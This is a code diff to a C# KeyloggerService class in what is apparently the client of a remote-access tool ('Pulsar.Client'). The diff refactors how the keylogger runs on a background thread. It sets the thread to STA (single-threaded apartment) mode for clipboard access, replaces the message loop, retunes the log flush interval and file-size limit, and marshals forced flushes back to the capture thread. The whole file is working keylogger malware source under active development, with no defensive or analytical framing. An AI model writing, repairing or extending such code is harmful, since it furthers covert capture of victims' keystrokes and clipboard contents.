@@ -7,16 +7,20 @@ using System.Windows.Forms;
 namespace Pulsar.Client.Logging
 {
     /// <summary>
-    /// Provides a service to run the keylogger within its own message loop.
+    /// Runs the keylogger inside its own clean WinForms message loop.
     /// </summary>
     public class KeyloggerService : IDisposable
     {
         private readonly Thread _msgLoopThread;
         private ApplicationContext _msgLoop;
         private Keylogger _keylogger;
+
+        private SynchronizationContext _syncContext;
+
         private readonly ManualResetEventSlim _initialized = new ManualResetEventSlim(false);
         private readonly ManualResetEventSlim _shutdownComplete = new ManualResetEventSlim(false);
         private readonly CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();
+
         private bool _disposed;
         private volatile bool _isRunning;
 
@@ -26,54 +30,50 @@ namespace Pulsar.Client.Logging
             {
                 IsBackground = true,
                 Name = "Keylogger Message Loop Thread",
-                Priority = ThreadPriority.BelowNormal // Reduce impact on system
+                Priority = ThreadPriority.BelowNormal
             };
+
+            // 🔥 REQUIRED for Clipboard, DragDrop, WinForms OLE calls
+            _msgLoopThread.SetApartmentState(ApartmentState.STA);
         }
 
-        /// <summary>
-        /// Gets whether the keylogger service is currently running.
-        /// </summary>
+
         public bool IsRunning => _isRunning && !_disposed;
 
-        /// <summary>
-        /// Event raised when the keylogger service encounters an error.
-        /// </summary>
         public event EventHandler<Exception> ErrorOccurred;
-
-        /// <summary>
-        /// Event raised when the keylogger service starts successfully.
-        /// </summary>
         public event EventHandler Started;
-
-        /// <summary>
-        /// Event raised when the keylogger service stops.
-        /// </summary>
         public event EventHandler Stopped;
 
+        // =====================================================
+        //  THREAD ENTRY POINT
+        // =====================================================
         private void MessageLoopThread()
         {
-            var threadId = Thread.CurrentThread.ManagedThreadId;
-
             try
             {
-                // Set up the message loop
-                SynchronizationContext.SetSynchronizationContext(new WindowsFormsSynchronizationContext());
+                // Install WinForms sync context for thread marshaling
+                _syncContext = new WindowsFormsSynchronizationContext();
+                SynchronizationContext.SetSynchronizationContext(_syncContext);
 
                 _msgLoop = new ApplicationContext();
 
-                // OPTIMIZED: 3-second flush for live viewing + 10MB file size
-                _keylogger = new Keylogger(6000, 10 * 1024 * 1024);
-
+                // Create and start keylogger
+                _keylogger = new Keylogger(3500, 100 * 1024);
                 _keylogger.Start();
+
                 _isRunning = true;
                 _initialized.Set();
 
-                // Notify start
                 OnStarted();
 
-                // Run the message loop with cancellation support
-                RunMessageLoopWithCancellation();
+                // Main loop with cancellation support
+                while (!_cancellationTokenSource.IsCancellationRequested)
+                {
+                    Application.DoEvents();
+                    Thread.Sleep(25);
+                }
 
+                _msgLoop.ExitThread();
                 _isRunning = false;
                 OnStopped();
             }
@@ -88,25 +88,9 @@ namespace Pulsar.Client.Logging
             }
         }
 
-        private void RunMessageLoopWithCancellation()
-        {
-            while (!_cancellationTokenSource.Token.IsCancellationRequested)
-            {
-                // Process all Windows messages in the queue
-                Application.DoEvents();
-
-                // OPTIMIZED: 25ms sleep for better CPU usage
-                //Thread.Sleep(25);
-            }
-
-            // Properly exit the application context
-            _msgLoop?.ExitThread();
-        }
-        /// <summary>
-        /// Starts the keylogger service and waits until it's ready.
-        /// </summary>
-        /// <param name="timeoutMs">Timeout in milliseconds to wait for initialization</param>
-        /// <returns>True if started successfully, false if timed out</returns>
+        // =====================================================
+        //  START
+        // =====================================================
         public bool Start(int timeoutMs = 10000)
         {
             if (_disposed)
@@ -120,31 +104,22 @@ namespace Pulsar.Client.Logging
                 _msgLoopThread.Start();
 
                 if (_initialized.Wait(timeoutMs))
-                {
                     return _isRunning;
-                }
-                else
-                {
-                    throw new TimeoutException("Keylogger service failed to initialize within the specified timeout.");
-                }
+
+                throw new TimeoutException("Keylogger failed to initialize.");
             }
 
             return _isRunning;
         }
 
-        /// <summary>
-        /// Starts the keylogger service asynchronously.
-        /// </summary>
-        public async Task<bool> StartAsync(int timeoutMs = 10000)
+        public Task<bool> StartAsync(int timeoutMs = 10000)
         {
-            return await Task.Run(() => Start(timeoutMs));
+            return Task.Run(() => Start(timeoutMs));
         }
 
-        /// <summary>
-        /// Stops the keylogger service.
-        /// </summary>
-        /// <param name="timeoutMs">Timeout in milliseconds to wait for shutdown</param>
-        /// <returns>True if stopped successfully, false if timed out</returns>
+        // =====================================================
+        //  STOP
+        // =====================================================
         public bool Stop(int timeoutMs = 5000)
         {
             if (_disposed || !_isRunning)
@@ -154,18 +129,11 @@ namespace Pulsar.Client.Logging
             {
                 _cancellationTokenSource.Cancel();
 
-                // Signal the message loop to exit
-                _msgLoop?.ExitThread();
-
                 if (_shutdownComplete.Wait(timeoutMs))
-                {
                     return true;
-                }
-                else
-                {
-                    OnErrorOccurred(new TimeoutException("Keylogger service failed to stop within the specified timeout."));
-                    return false;
-                }
+
+                OnErrorOccurred(new TimeoutException("Keylogger service failed to stop."));
+                return false;
             }
             catch (Exception ex)
             {
@@ -174,46 +142,49 @@ namespace Pulsar.Client.Logging
             }
         }
 
-        /// <summary>
-        /// Forces an immediate flush of the keylogger buffer.
-        /// </summary>
+        // =====================================================
+        //  FORCE FLUSH — NOW FIXED
+        // =====================================================
         public void Flush()
         {
-            if (_isRunning && _keylogger != null)
+            if (!_isRunning || _keylogger == null)
+                return;
+
+            try
             {
-                try
+                if (_syncContext != null)
                 {
-                    // Use Invoke if we're on a different thread
-                    if (_msgLoop != null && _msgLoop.MainForm != null && !_msgLoop.MainForm.InvokeRequired)
-                    {
-                        _keylogger.FlushImmediately();
-                    }
-                    else
-                    {
-                        _msgLoop?.MainForm?.Invoke((MethodInvoker)(() => _keylogger.FlushImmediately()));
-                    }
+                    // Marshal flush back to the keylogger thread
+                    _syncContext.Post(_ => _keylogger.FlushImmediately(), null);
                 }
-                catch (Exception ex)
+                else
                 {
-                    OnErrorOccurred(ex);
+                    // Fallback (should never happen)
+                    _keylogger.FlushImmediately();
                 }
+            }
+            catch (Exception ex)
+            {
+                OnErrorOccurred(ex);
             }
         }
 
-        /// <summary>
-        /// Restarts the keylogger service.
-        /// </summary>
+        // =====================================================
+        //  RESTART
+        // =====================================================
         public async Task<bool> RestartAsync(int shutdownTimeoutMs = 5000, int startupTimeoutMs = 10000)
         {
             if (Stop(shutdownTimeoutMs))
             {
-                // Small delay to ensure clean shutdown
-                await Task.Delay(1000);
+                await Task.Delay(500);
                 return await StartAsync(startupTimeoutMs);
             }
             return false;
         }
 
+        // =====================================================
+        //  EVENTS
+        // =====================================================
         protected virtual void OnErrorOccurred(Exception ex)
         {
             ErrorOccurred?.Invoke(this, ex);
@@ -229,6 +200,9 @@ namespace Pulsar.Client.Logging
             Stopped?.Invoke(this, EventArgs.Empty);
         }
 
+        // =====================================================
+        //  DISPOSE
+        // =====================================================
         protected virtual void Dispose(bool disposing)
         {
             if (_disposed)
@@ -236,22 +210,15 @@ namespace Pulsar.Client.Logging
 
             if (disposing)
             {
-                // Signal cancellation first
                 _cancellationTokenSource.Cancel();
 
                 try
                 {
-                    // Stop the service if it's running
                     if (_isRunning)
-                    {
                         Stop(3000);
-                    }
 
-                    // Wait for thread to complete
                     if (_msgLoopThread.IsAlive && !_msgLoopThread.Join(2000))
-                    {
                         _msgLoopThread.Interrupt();
-                    }
                 }
                 catch (Exception ex)
                 {
@@ -259,16 +226,15 @@ namespace Pulsar.Client.Logging
                 }
                 finally
                 {
-                    // Dispose resources
                     _keylogger?.Dispose();
                     _keylogger = null;
 
                     _msgLoop?.Dispose();
                     _msgLoop = null;
 
-                    _cancellationTokenSource?.Dispose();
-                    _initialized?.Dispose();
-                    _shutdownComplete?.Dispose();
+                    _cancellationTokenSource.Dispose();
+                    _initialized.Dispose();
+                    _shutdownComplete.Dispose();
                 }
             }
 
